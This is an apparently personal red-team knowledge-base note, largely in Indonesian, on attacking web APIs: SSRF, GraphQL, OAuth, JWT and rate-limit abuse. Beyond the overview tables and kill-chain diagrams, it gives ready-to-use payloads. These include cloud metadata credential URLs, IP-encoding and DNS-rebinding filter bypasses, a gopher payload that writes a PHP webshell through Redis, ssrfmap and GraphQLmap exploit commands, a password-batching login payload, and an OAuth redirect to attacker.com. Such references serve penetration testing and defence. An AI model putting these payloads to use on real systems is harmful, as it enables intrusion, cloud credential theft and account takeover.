---
title: Attack Perspective — Web API & SSRF (Red Team)
tags:
- attack
- red-team
- api
- ssrf
- graphql
- rest
- imds
- oauth
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  
---

# Web API & SSRF — Perspektif Penyerang

> API = data gateway modern. SSRF = jembatan ke internal. Red team: API enum (Swagger/OpenAPI), GraphQL introspection, SSRF → IMDS, OAuth flow abuse, rate limit bypass.

## 1. Attack Surface API

| Komponen | Vektor | MITRE ID | Tool / Teknik | Evasion | Detection Gap |
|----------|--------|----------|---------------|---------|----------------|
| **REST API** | IDOR, mass assignment, auth bypass | T1190 | Burp, Postman, manual | Param fuzz = legit request | API audit = rare |
| **GraphQL** | Introspection, batch query, mutation abuse | T1190 | graphql-introspection, Altair | Introspection = public by default | GraphQL audit = rare |
| **Swagger/OpenAPI** | Doc leak → endpoint discovery | T1590 | swagger-ui scan, /v2/api-docs | Doc = public (misconfig) | Doc audit = rare |
| **SSRF** | Internal scan, IMDS creds | T1190 | Burp, custom | Filter bypass (redirect, DNS rebind) | Egress filter = partial |
| **OAuth** | Redirect URI abuse, token theft | T1557 | Burp, manual | Redirect = legit flow | OAuth audit = rare |
| **JWT** | alg:none, key confusion, weak secret | T1143 | jwt_tool, hashcat | JWT = valid format | JWT audit = rare |
| **Rate Limit** | No rate limit → brute, credential stuffing | T1110 | Burp Intruder, custom | Distributed = below threshold | Rate audit = per-IP only |
| **Webhook** | Webhook injection → SSRF via webhook | T1190 | Custom webhook → internal URL | Webhook = legit feature | Webhook audit = rare |

## 2. SSRF Kill Chain

```
Recon: Find parameter yang fetch URL
  ├── url=, link=, next=, redirect=, webhook=, callback=
  ├── Import feature (URL import, RSS fetch)
  └→ Webhook config (send to URL)
    ↓
Test: url=http://127.0.0.1:80 → response? 
  ├── Ya → SSRF confirmed
  ├── Filter → bypass (redirect, DNS rebind, IPv6, decimal)
  └→ Blind SSRF → timing (sleep) / DNS callback (interactsh)
    ↓
Exploit:
  ├── Internal scan: http://10.0.0.0/8 → port scan internal
  ├── IMDS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ├── Internal service: http://localhost:6379 (Redis) → RCE
  ├── Cloud metadata: GCP, Azure MSI
  └→ File read: file:///etc/passwd (if scheme allowed)
    ↓
Result: Internal access → cloud creds → lateral
```

## 3. GraphQL Attack

```
Discovery: /graphql, /v1/graphql, /api/graphql
    ↓
Introspection:
  POST {"query":"{__schema{types{name fields{name}}}}"}
  → full schema dump → all query/mutation
    ↓
Attack:
  ├── IDOR: query user(id:1) → user(id:2) → data access
  ├── Batch: query{ a:user(id:1) b:user(id:2) } → rate bypass
  ├── Mutation abuse: mutation{ updateRole(id:1, role:"admin") }
  ├── Introspection disable bypass: fragment overlap, aliasing
  └→ Error-based: trigger error → schema leak
    ↓
Evasion: GraphQL = single endpoint → WAF rule = generic (bypass via query shape)
```

## 4. OAuth Flow Abuse

```
Recon: Login flow → OAuth provider (Google/GitHub/Azure)
  ├── redirect_uri, client_id, scope
  └→ Callback endpoint
    ↓
Attack:
  ├── Redirect URI: change redirect_uri → attacker.com → token ke attacker
  ├── Token theft: CSRF → attacker login → bind victim account
  ├── Scope abuse: request extra scope (email, admin)
  └→ Authorization code replay
    ↓
Result: Account takeover / API access
```

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **Burp Suite** | API intercept, SSRF testing, OAuth flow |
| **ffuf** | API endpoint discovery |
| **Altair / GraphQL Playground** | GraphQL exploration |
| **jwt_tool** | JWT attack |
| **interactsh** | Blind SSRF callback |
| **nuclei** | API vuln template |

## 6. Referensi
- OWASP API Top 10 — https://owasp.org/www-project-api-security/
- PortSwigger SSRF — https://portswigger.net/web-security/ssrf
- GraphQL Security — https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application
- JWT Attack — https://portswigger.net/web-security/jwt

## 7. Payload Konkret — SSRF Bypass Filter (Testable)

### Cloud Metadata (IMDS)

```
# AWS IMDSv1 (legacy, no auth)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>/

# GCP
http://metadata.google.internal/computeMetadata/v1/
  Header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Header: Metadata: true
```

### Localhost Bypass Variants

```
# IPv4 loopback (semua resolve ke 127.0.0.1)
http://127.0.0.1:80
http://127.127.127.127
http://127.0.1.3
http://127.1
http://0
http://0.0.0.0:80

# IPv6 notation
http://[::]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]

# CIDR loopback (127.0.0.0/8)
http://127.0.1.3
http://127.255.255.254
```

### Encoding Bypass

```
# Decimal IP (penting: metadata AWS)
http://2130706433/        = 127.0.0.1
http://2852039166/        = 169.254.169.254  (AWS metadata!)

# Hex IP
http://0x7f000001          = 127.0.0.1
http://0xa9fea9fe          = 169.254.169.254

# Octal IP
http://0177.0.0.1/         = 127.0.0.1

# Double URL encode
http://%31%32%37%2e%30%2e%30%2e%31/
```

### DNS Rebinding (Instant)

```
# NIP.IO: <apa saja>.<IP>.nip.io → resolve ke IP itu
http://127.0.0.1.nip.io:80/
http://company.127.0.0.1.nip.io/

# 2-phase: resolve pertama IP attacker (lolos filter) → kedua 127.0.0.1
# Tools: rbndr.us, ceye.io, custom DNS server TTL 0
```

### Gopher → RCE (Redis / FastCGI)

```
# Redis: tulis webshell ke webroot
gopher://127.0.0.1:6379/_FLUSHALL%0aSET%20shell%20"%3C%3Fphp%20system(%24_GET['c'])%3B%3F%3E"%0aSAVE%0a

# FastCGI (PHP-FPM RCE)
gopher://127.0.0.1:9000/_...  (generate dengan Gopherus)
```

### SSRFmap Exploit (28 Handler)

```bash
# Fuzz endpoint + auto-exploit ke Redis
python3 ssrfmap.py -r request.txt -p url -m redis

# Handler tersedia: redis, aws, docker, fastcgi, mysql, postgres,
#   consul, github, gce, readfiles, portscan, networkscan, smbhash,
#   smtp, tomcat, zabbix, socksproxy, dll.
```

### Test Checklist SSRF

1. Cek param `url`, `src`, `target`, `redirect`, `path`, `file`
2. Blind SSRF: gunakan Burp Collaborator / interactsh
3. Timing: `url=http://attacker.com/slow` → detect via latency
4. Error-based: `file:///etc/passwd` → response beda
5. Metadata: selalu test `169.254.169.254` (AWS/Azure/GCP)

## GraphQL Konkret (Introspection + Batch)

```bash
# GraphQLmap: introspection
python3 graphqlmap.py -u http://target/graphql -m introspection

# atau manual: query __schema
{"query":"{ __schema { types { name fields { name } } } }"}
```

### Endpoint Discovery

```
/graphql
/graphiql
/graphql/console/
/graphql.php
/graph
/v1/graphql
/api/graphql
```

### Batching Attack (Bypass Rate Limit)

```json
[
  {"query": "mutation { login(user:\"admin\", pass:\"password1\") }"},
  {"query": "mutation { login(user:\"admin\", pass:\"password2\") }"},
  {"query": "mutation { login(user:\"admin\", pass:\"password3\") }"}
]
```

Batch kirim N password dalam 1 request → bypass rate limit.

### GraphQLmap (Scripting Engine)

```bash
# Field suggestion (introspection off)
python3 graphqlmap.py -u http://target/graphql -m suggest

# Extract data
python3 graphqlmap.py -u http://target/graphql
# GraphQLmap> { user { id email password } }
```
---

audited
---
